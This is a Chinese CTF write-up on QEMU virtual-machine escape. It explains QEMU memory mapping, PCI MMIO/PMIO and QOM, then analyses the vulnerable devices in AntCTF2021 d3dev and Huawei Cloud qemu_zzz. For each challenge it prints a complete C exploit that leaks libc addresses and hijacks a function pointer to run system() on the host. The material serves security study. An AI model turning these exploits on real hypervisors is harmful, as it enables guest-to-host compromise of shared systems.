> 原文链接: https://www.anquanke.com//post/id/235191 


# qemu逃逸学习


                                阅读量   
                                **113088**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t016dfa66db8e4db21a.png)](https://p3.ssl.qhimg.com/t016dfa66db8e4db21a.png)



## qemu的基本知识

### <a class="reference-link" name="qemu%20%E7%9A%84%E5%86%85%E5%AD%98%E9%85%8D%E7%BD%AE"></a>qemu 的内存配置

```
Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++

```

### <a class="reference-link" name="%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2"></a>地址转换

用户虚拟地址-&gt;用户物理地址

用户物理地址-&gt;qemu的虚拟地址空间

```
7f1824ecf000-7f1828000000 rw-p 00000000 00:00 0
7f1828000000-7f18a8000000 rw-p 00000000 00:00 0         [2 GB of RAM]
7f18a8000000-7f18a8992000 rw-p 00000000 00:00 0
7f18a8992000-7f18ac000000 ---p 00000000 00:00 0
7f18b5016000-7f18b501d000 r-xp 00000000 fd:00 262489    [first shared lib]
7f18b501d000-7f18b521c000 ---p 00007000 fd:00 262489           ...
7f18b521c000-7f18b521d000 r--p 00006000 fd:00 262489           ...
7f18b521d000-7f18b521e000 rw-p 00007000 fd:00 262489           ...

                     ...                                [more shared libs]

7f18bc01c000-7f18bc5f4000 r-xp 00000000 fd:01 30022647  [qemu-system-x86_64]
7f18bc7f3000-7f18bc8c1000 r--p 005d7000 fd:01 30022647         ...
7f18bc8c1000-7f18bc943000 rw-p 006a5000 fd:01 30022647         ...

7f18bd328000-7f18becdd000 rw-p 00000000 00:00 0         [heap]
7ffded947000-7ffded968000 rw-p 00000000 00:00 0         [stack]
7ffded968000-7ffded96a000 r-xp 00000000 00:00 0         [vdso]
7ffded96a000-7ffded96c000 r--p 00000000 00:00 0         [vvar]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
```

#### <a class="reference-link" name="pagemap"></a>pagemap

/proc/$pid/pagemap存储进程虚拟地址的也表项，也就是page table

VPFN：virtual page frame number，虚拟页号

PFN：page frame number frame number，页号

[![](https://p0.ssl.qhimg.com/t01fa11f1b781bc860c.png)](https://p0.ssl.qhimg.com/t01fa11f1b781bc860c.png)<br>
pagemap的格式
<li>Bits 0-54 page frame number (PFN) if present
<ul>
- Bits 0-4 swap type if swapped
- Bits 5-54 swap offset if swapped
### <a class="reference-link" name="PCI"></a>PCI

**符合 PCI 总线标准的设备就被称为 PCI 设备**，PCI 总线架构中可以包含多个 PCI 设备。图中的 Audio、LAN 都是一个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。

[![](https://p3.ssl.qhimg.com/t01fe9f5fff29da261d.jpg)](https://p3.ssl.qhimg.com/t01fe9f5fff29da261d.jpg)

#### <a class="reference-link" name="mmio"></a>mmio

内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。

[![](https://p4.ssl.qhimg.com/t019d8a802443669d48.png)](https://p4.ssl.qhimg.com/t019d8a802443669d48.png)

#### <a class="reference-link" name="pmio"></a>pmio

端口映射io，内存和io设备有个字独立的地址空间，cpu需要通关专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。

[![](https://p2.ssl.qhimg.com/t01f433e5913c4fd38e.png)](https://p2.ssl.qhimg.com/t01f433e5913c4fd38e.png)

#### <a class="reference-link" name="lspci%E5%91%BD%E4%BB%A4"></a>lspci命令

pci外设地址，形如`0000:00:1f.1`。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。

[![](https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png)](https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png)

`lspci -v -t`会用树状图的形式输出pci设备，会显得更加直观

[![](https://p2.ssl.qhimg.com/t0106de490068b32c99.png)](https://p2.ssl.qhimg.com/t0106de490068b32c99.png)

`lspci -v`就能输出设备的详细信息

[![](https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png)](https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png)

仔细观察相关的输出，可以从中知道mmio的地址是`0xfebf1000`，pmio的端口是`0xc050`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0129b36299082dc698.png)

在`/sys/bus/pci/devices`可以找到每个总线设备相关的一写文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ddba05509f456110.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016c20a809c748def6.png)

每个设备的目录下`resource0` 对应MMIO空间。`resource1` 对应PMIO空间。<br>
resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。

### <a class="reference-link" name="QOM(qemu%20object%20model)"></a>QOM(qemu object model)

#### <a class="reference-link" name="TypeInfo"></a>TypeInfo

TypeInfo定义了一个类，下面代码所示

```
static const TypeInfo strng_info = `{`
        .name          = "strng",
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(STRNGState),
        .instance_init = strng_instance_init,
        .class_init    = strng_class_init,
`}`;
```

定义中包含这个类的
- 名称 name
- 父类 parent
- 实例的大小 instance_size
- 是否是抽象类 abstract
- 初始化函数 class_init
代码底部有type**init函数，可以看到这个函数实际是执行的register<em>module_init，由于有`__attribute**</em>((constructor))`关键字，所以这个函数会在main函数之前执行。

```
type_init(pci_strng_register_types)

#define type_init(function) module_init(function, MODULE_INIT_QOM)

#define module_init(function, type)                                         \
static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \
`{`                                                                           \
    register_module_init(function, type);                                   \
`}`
#endif

void register_module_init(void (*fn)(void), module_init_type type)
`{`
    ModuleEntry *e;
    ModuleTypeList *l;

    e = g_malloc0(sizeof(*e));
    e-&gt;init = fn;
    e-&gt;type = type;

    l = find_type(type);

    QTAILQ_INSERT_TAIL(l, e, node);
`}`
```

这里register_module_init中创建了一个type为MODULE_INIT_QOM，init为pci_strng_register_types的一个 ModuleEntry，并且他加入到MODULE_INIT_QOM的ModuleTypeList链表上。

在main函数中会调用`module_call_init(MODULE_INIT_QOM);`将MODULE_INIT_QOM)对应的ModuleTypeList上的每个 ModuleEntry都调用其init函数。对于以上的例子来说就会掉用`pci_strng_register_types`。

```
static void pci_strng_register_types(void)
`{`
    static const TypeInfo strng_info = `{`
        .name          = "strng",
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(STRNGState),
        .instance_init = strng_instance_init,
        .class_init    = strng_class_init,
    `}`;

    type_register_static(&amp;strng_info);
`}`
```

这里初始化了一个strng_info的TypeInfo，然后掉用type_register_static

```
TypeImpl_0 *__fastcall type_register_static(const TypeInfo_0 *info)
`{`
  __readfsqword(0x28u);
  __readfsqword(0x28u);
  return type_register(info);
`}`

TypeImpl_0 *__fastcall type_register(const TypeInfo_0 *info)
`{`
  TypeImpl_0 *v1; // rbx
  TypeImpl_0 *result; // rax
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( !info-&gt;parent || (v1 = type_new(info), type_table_add(v1), result = v1, __readfsqword(0x28u) != v3) )
    __assert_fail("info-&gt;parent", "/home/rcvalle/qemu/qom/object.c", 0x92u, "type_register");
  return result;
`}`
```

可以看到type_register_static掉用了type_register，在type_register中执行了`v1 = type_new(info), type_table_add(v1),`这部操作。这两个函数分别初根据info初始化了一个TypeImpl对象v1，然后把v1添加到全局的type_table中。

#### <a class="reference-link" name="TypeImpl"></a>TypeImpl

这个结构是根据TypeInfo来进行创建，各个类之间的继承关系都依赖这个结构，这个结构中还包含了所对应的类的构造和析构函数，还有实例的构造和析构函数。

```
struct TypeImpl
`{`
    const char *name;

    size_t class_size;

    size_t instance_size;

    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void (*class_finalize)(ObjectClass *klass, void *data);

    void *class_data;

    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);

    bool abstract;

    const char *parent;
    TypeImpl *parent_type;

    ObjectClass *class;

    int num_interfaces;
    InterfaceImpl interfaces[MAX_INTERFACES];
`}`;
```

#### <a class="reference-link" name="ObjectClass"></a>ObjectClass

这是所有class的基类或者说是是所有class的结构，在ObjectClass对象创建时会更具type（TypeImpl）根据类之间的继承关系逐个进行初始化。

```
struct ObjectClass
`{`
    /*&lt; private &gt;*/
    Type type;
    GSList *interfaces;

    const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE];
    const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE];

    ObjectUnparent *unparent;
`}`;
```

#### <a class="reference-link" name="Object"></a>Object

所有object的基类，或者可以说是所有object的结构，他其中会包含指向对应类对象的指针。object会根据class中type的继承关系递归的初始化实例。

```
struct Object
`{`
    /*&lt; private &gt;*/
    ObjectClass *class;
    ObjectFree *free;
    QTAILQ_HEAD(, ObjectProperty) properties;
    uint32_t ref;
    Object *parent;
`}`;
```

### <a class="reference-link" name="%E5%88%B6%E4%BD%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"></a>制作文件系统

编译busybox

make menuconfig 设置

Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary 编译成 静态文件

关闭下面两个选项

Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统<br>
Networking Utilities -&gt; [] inetd (Internet超级服务器)

```
cd _install
mkdir proc sys dev etc etc/init.d
touch etc/init.d/rcS
chmod +x etc/init.d/rcS #给启动脚本加上运行权限
```

`etc/init.d/rcS`为Linux的启动脚本，项其中写入以下内容

```
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
/sbin/mdev -s
```

### <a class="reference-link" name="%E5%90%AF%E5%8A%A8qemu"></a>启动qemu

```
/CTF/qemu_escape/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 -m 2048 --nographic \
   -kernel /CTF/kernel/linux-4.9/arch/x86_64/boot/bzImage -initrd /CTF/qemu_escape/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" \
    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \
    -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \
```

退出qemu的终端用`ctrl+a+x`



## 题目

### <a class="reference-link" name="AntCTF2021%20d3dev"></a>AntCTF2021 d3dev

#### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

首先打开launch.sh可以看到`-devive d3dev`说明加载了名叫d3dev的pci设备。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017f706229b9b3e5f6.png)

接着用ida打开qemu-system-x86_64在函数框中搜索d3dev，终端关注d3dev_mmio_read，d3dev_mmio_write，d3dev_pmio_read，d3dev_pmio_write这四个函数，这个四个函数分别是mmio模式下的读写操作，pmio模式下的读写操作。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0174116cf0d9a2f73c.png)

打开ida的Local type窗口搜索d3dev搜索出如下结构，这就是d3dev这个设备的实例结构。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0141aeccf437c4cd0a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d9820c136ec8be8d.png)

为了使代码更加清晰，将四个函数中所有个opaque都换成如下类型

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01312d847d00cdef7d.png)

接下来大致分析一下每个函数的作用，在开始之前希望读者去了解一下tea加密算法。

##### <a class="reference-link" name="mmio_read"></a>mmio_read

mmio_read用tea算法解密指定位置上的内容，解密后的低4字节和高4字节的的数据可以分两次读出来。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013e34b3ca1f1f0c81.png)

##### <a class="reference-link" name="mmio_write"></a>mmio_write

mmio_write第一次的时候先往指定block位置写入你传入的val，第二次时候会val作为高4字节的数据，指定位置的内容作为低4节数据送到tea中进行加密然后将，加密结果写回指定位置。

[![](https://p2.ssl.qhimg.com/t01c3e6ce04a8705981.png)](https://p2.ssl.qhimg.com/t01c3e6ce04a8705981.png)

##### <a class="reference-link" name="pmio_read"></a>pmio_read

pmio_read有点特别，他会掉用`dword_7ADF30 + dword_7ADF30[addr]`这个位置的函数

[![](https://p3.ssl.qhimg.com/t019f317206feb8f6e0.png)](https://p3.ssl.qhimg.com/t019f317206feb8f6e0.png)

这里反编译出来看的不太明显进入汇编看看就很明显了，首先是dword_7ADF30处的内容，将第0、8、12、16、20、和24的数和0x7ADF30相加就回得到0x4D7D40、0x4D7D50，0x4D7D60、0x4D7D70、0x4D7D80和0x4D7D30。结合个之前Structure中的内容，我们发现当addr=12、16、20、24时我们就可以分别独处key[0]、key[1]、key[2]、key[3]。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01832dadeed898690e.png)

[![](https://p2.ssl.qhimg.com/t012f2be7b94c8b7878.png)](https://p2.ssl.qhimg.com/t012f2be7b94c8b7878.png)

##### <a class="reference-link" name="pmio_write"></a>pmio_write

pmio_write，当addr（就是传入的端口值）为：
- 8：可以设置seek的值，应为mmio的读写位置都是`opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3)`这么指定的同时由于qemu的限制addr的范围不能超过256，所以可以通过设置seek来进行越界的访问。
<li>28：可以执行rand_r函数<br>[![](https://p3.ssl.qhimg.com/t01345f5edeb2f0cf1f.png)](https://p3.ssl.qhimg.com/t01345f5edeb2f0cf1f.png)<h4 id="h4-u601Du8DEF">
<a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路</h4>
</li>
##### <a class="reference-link" name="libc%E6%B3%84%E6%BC%8F"></a>libc泄漏
1. 用pmio_write设置seek为0x100
1. 利用mimo_write对rand_r进行加密
1. 利用mimo_read读出解密后rand_r的地址，计算出libc的地址，从而计算出system的地址。
##### <a class="reference-link" name="%E6%89%A7%E8%A1%8Cshell"></a>执行shell
1. 利用pmio_read读出四个key的，然后用解密函数system，然后将解密后的内容通过mmio_write写入rand_r中，由于写入后回进行加密就会将我们解密后的内容重新变成system写入rand_r中。
1. 利用pmio_write传入参数执行rand_r函数获取flag。
#### <a class="reference-link" name="EXP"></a>EXP

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdint.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/io.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/io.h&gt;

#define _DWORD uint32_t
#define LODWORD(x) (*((_DWORD *)&amp;(x)))

size_t mmio_base;
size_t port_base = 0xc040;
u_int32_t key[4];

void mmio_write(size_t addr, u_int32_t val)
`{`
    *(u_int32_t *)(mmio_base + addr) = val;
`}`

u_int32_t mmio_read(addr)
`{`
    return *(u_int32_t *)(mmio_base + addr);
`}`

void pmio_write(size_t port, u_int32_t val)
`{`
    outl(val, port_base + port);
`}`

size_t pmio_read(size_t port)
`{`
    return inl(port_base + port);
`}`

size_t tea(size_t m)
`{`
    uint64_t v3;
    signed int v4;   // esi
    unsigned int v5; // ecx
    uint64_t result; // rax

    v3 = m;
    v4 = -957401312;
    v5 = v3;
    result = v3 &gt;&gt; 32;
    do
    `{`
        LODWORD(result) = result - ((v5 + v4) ^ (key[3] + (v5 &gt;&gt; 5)) ^ (key[2] + 16 * v5));
        v5 -= (result + v4) ^ (key[1] + ((unsigned int)result &gt;&gt; 5)) ^ (key[0] + 16 * result);
        v4 += 1640531527;
    `}` while (v4);

    printf("0x%lx\n", v5);
    printf("0x%lx\n", result);
    return result &lt;&lt; 32 | (u_int64_t)v5;
`}`

int main()
`{`

    int fd = open("/sys/bus/pci/devices/0000\:00\:03.0/resource0", O_RDWR | O_SYNC);
    mmio_base = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (iopl(3) != 0)
    `{`
        puts("iopl fail!");
        exit(-1);
    `}`

    pmio_write(8, 0x100);
    // getchar();
    mmio_write(8, 0);
    mmio_write(0x18, 0);
    // getchar();
    u_int32_t tmp;
    u_int64_t rand_addr;
    u_int64_t libc, sys;
    rand_addr = mmio_read(0x18);
    printf("rand 0x%llx\n", rand_addr);
    rand_addr += ((u_int64_t)mmio_read(0x18)) &lt;&lt; 32;
    printf("rand 0x%llx\n", rand_addr);

    libc = rand_addr - 0x4aeb0;
    printf("libc 0x%llx\n", libc);

    sys = libc + 0x55410;
    printf("sys 0x%llx\n", sys);
    printf("sys_low 0x%llx\n", sys &amp; 0xffffffff);

    key[0] = pmio_read(12);
    key[1] = pmio_read(16);
    key[2] = pmio_read(20);
    key[3] = pmio_read(24);
    for (int i = 0; i &lt; 4; i++)
    `{`
        printf("key%d: 0x%lx\n", i, key[i]);
    `}`
    u_int64_t t = tea(sys);
    printf("tea sys 0x%lx\n", t);
    printf("tea sys low 0x%lx\n", t &amp; 0xffffffff);
    mmio_write(0x18, t &amp; 0xffffffff);
    printf("tea sys high 0x%lx\n", t &gt;&gt; 32);
    mmio_write(0x18, t &gt;&gt; 32);

    // getchar();
    char *flag = "cat flag";
    tmp = tmp = *((u_int32_t *)flag + 1);
    printf("0x%lx", tmp);
    pmio_write(8, 0);
    mmio_write(0, tmp);
    tmp = *(u_int32_t *)flag;
    printf("0x%lx", tmp);
    pmio_write(28, tmp);
    return 0;
`}`
```

### <a class="reference-link" name="%E5%8D%8E%E4%B8%BA%E4%BA%91qemu_zzz"></a>华为云qemu_zzz

#### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

打开qmeu的加载文件，可以看到其加载了一个zzz设备，漏洞就在这个设备上。

[![](https://p3.ssl.qhimg.com/t0129d970aaa2ce6e18.png)](https://p3.ssl.qhimg.com/t0129d970aaa2ce6e18.png)

在函数中搜索zzz，可以看到zzz设备有如下几个函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fa0e920c00ec6029.png)

打开zzz_instance_init函数，这个函数是设备实例的初始化，可以看到他将设备实例的起始地址存放在0x19F0位置，在0x19F8位置存放cpu_physical_memory_rw函数的地址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014b17b5d3ad7d0d89.png)

通过分析zzz_mmio_write函数可以大致描述处这个设备的结构

```
struct ZZZState
`{`
  ...
  qword rw_addr;        // 0x9e0;
  word  len ;                //0x9e8;最低位为读写标志位
  word    offset;            // 0x9ea;
  byte    buf[0x1000];//0x9f0
  qword base_addr;    //0x19f0;指向ZZZState的地址
  qword cpu_physical_memory_rw;    //0x19f8;
`}`
```

zzz_mmio_read是通过传入的值读出buf的内容，这里意义不大。我们主要观察zzz_mmio_write

#### <a class="reference-link" name="zzz_mmio_write"></a>zzz_mmio_write

这个函数会根据传入的addr执行不同的操作，具体入下
- 0x20：设置的读写地址rw_addr，**这里应该是虚拟机的物理地址**，利用cpu_physical_memory_rw对其进行读写。可以实际上的地址是rw_addr*0x1000,可以mmap一个0x1000的空间，注意申请后得到的是虚拟机中的虚拟地址需要转换为虚拟机的物理地址才能够传入rw_addr。
- 0x10：设置offset值，用cpu_physical_memory_rw读写的时候buf的偏移。
- 0x18：设置len为读写长度，用cpu_physical_memory_rw读写的时候buf的长度，其中最低位表示是进行读操作还是写操作。
- 0x50：会根据len和offset值对buf中的数据进行加密。
- 0x60：**跟根据base_addr取出len和offset**，然后掉用cpu_physical_memory_rw对buf进行读写操作。
在0x60的操作中会有一个溢出漏洞(signed int)(offset + len – 1) &lt;= 0x1000，因为buf只有0x1000的长度，而这里可以写到第0x1001个字节即能够改变base_addr的最低一个字节。由于0x60时候是根据base_addr来读取数据的，因此可以利用这个漏洞。

#### <a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路
<li>首先对buf中进行数据布置
<ol>
1. 由于低12位的字节是固定的因此可以算出buf中的一个能被0x1000整除的地址的偏移，向其中写入cat flag。
1. 根据之后要改变的base_addr在buf的指定位置设置rw_addr、len和offset，供之后之后使用。1. 在0x19e8的位置布置上system的地址
1. 在buf的某个地方写上cat flag的地址（之前我们在能够被0x1000整除的地址上写的），布置上合理的len和offset
1. 根据2写入的地址计算出基地址base_addr写入0x19e0的位置
#### <a class="reference-link" name="EXP"></a>EXP

```
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;assert.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/pci.h&gt;
#include &lt;sys/io.h&gt;
#include &lt;string.h&gt;

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)
#define PFN_PRESENT (1ull &lt;&lt; 63)
#define PFN_PFN ((1ull &lt;&lt; 55) - 1)

size_t mmio_addr;
int fd;

size_t mmio_read(u_int64_t addr)
`{`
    return *(size_t *)(mmio_addr + addr);
`}`

void mmio_write(u_int64_t addr, u_int64_t val)
`{`
    *(size_t *)(mmio_addr + addr) = val;
`}`

uint32_t page_offset(uint32_t addr)
`{`
    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);
`}`

uint64_t gva_to_gfn(void *addr)
`{`
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &amp;pme, 8);
    if (!(pme &amp; PFN_PRESENT))
        return -1;
    gfn = pme &amp; PFN_PFN;
    return gfn;
`}`

uint64_t gva_to_gpa(void *addr)
`{`
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);
`}`

int main(int argc, char const *argv[])
`{`
    //获取一段0x1000的空间
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd &lt; 0)
    `{`
        puts("[*]pagemap error!");
        exit(0);
    `}`
    u_int64_t target = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    mlock(target, 0x1000);
    printf("[*] visual addr 0x%lx\n", target);
    u_int64_t pt = gva_to_gpa(target);
    printf("[*] physical addr 0x%lx\n", pt);

    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd &lt; 0)
    `{`
        puts("[*]mmio open file error!");
        exit(0);
    `}`
    mmio_addr = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    //设置目标地址,设置相关的位置
    mmio_write(0x20, pt &gt;&gt; 12);
    // mmio_write(0x10, 0xfff);
    // mmio_write(0x18, 0x3);
    // mmio_write(0x60, 1);
    // for (int i = 0; i &lt; 8; i++)
    // `{`
    //     *(u_int8_t *)(target + i) = 0x22;
    // `}`

    // puts("this is write");
    // mmio_write(0x10, 0x0);//off
    // mmio_write(0x18, 0x8|1);//len
    // mmio_write(0x60, 0);

    // u_int8_t t=mmio_read(0);
    // printf("0x%lx\n",t);

    // getchar();
    puts("this is write");
    mmio_write(0x10, 0);
    mmio_write(0x18, 0xb00);
    strcpy((char *)(target + 0xa10), "cat flag\0");
    *(u_int64_t *)(target + 0x10) = pt;
    *(u_int16_t *)(target + 0x18) = 0x10 | 1;
    *(u_int16_t *)(target + 0x1a) = 0xfe0;
    mmio_write(0x60, 0);
    // getchar();

    // 修改基地址
    mmio_write(0x10, 0xfff);
    mmio_write(0x18, 2);
    *(u_int8_t *)target = 0x00;
    *(u_int8_t *)(target + 1) = 0x20;
    mmio_write(0x60, 0);
    // getchar();

    //读出cpu_physical_memory_rw
    // mmio_write(0x10, 0xff0);
    // mmio_write(0x18, 0x10 | 1);
    mmio_write(0x60, 0);
    printf("base addr 0x%lx\n", *(u_int64_t *)(target));
    printf("cpu_physical_memory_rw 0x%lx\n", *(u_int64_t *)(target + 8));
    // getchar();
    u_int64_t base = *(u_int64_t *)(target);
    u_int64_t cpu = *(u_int64_t *)(target + 8);
    u_int64_t sys = (cpu - 0x5BC5C0) + 0x2A7A80;
    printf("system addr 0x%lx\n", sys);

    //利用加密改变读写位置
    mmio_write(0x10, 0x18);
    mmio_write(0x18, 0x40);
    mmio_write(0x50, 0);
    getchar();

    puts("[*]wirte the system");
    u_int64_t sh = base - 0x20 + 0x9f0 + 0xa10;
    printf("sh addr 0x%lx\n", sh);

    getchar();

    u_int64_t new_base = (base + 0x9f0 + 0xdf0) - 0x9e0;
    printf("new_base addr 0x%lx\n", new_base);

    *(u_int64_t *)(target + 7) = sh;
    *(u_int16_t *)(target + 7 + 8) = 0;
    *(u_int16_t *)(target + 7 + 0xa) = 0x11;

    *(u_int64_t *)(target + (0x1000 - 0x20 - 0xde9)) = new_base;
    *(u_int64_t *)(target + (0x1000 - 0x20 - 0xde9 + 8)) = sys;
    mmio_write(0x60, 0);

    getchar();

    mmio_write(0x60, 0);

    return 0;
`}`
```
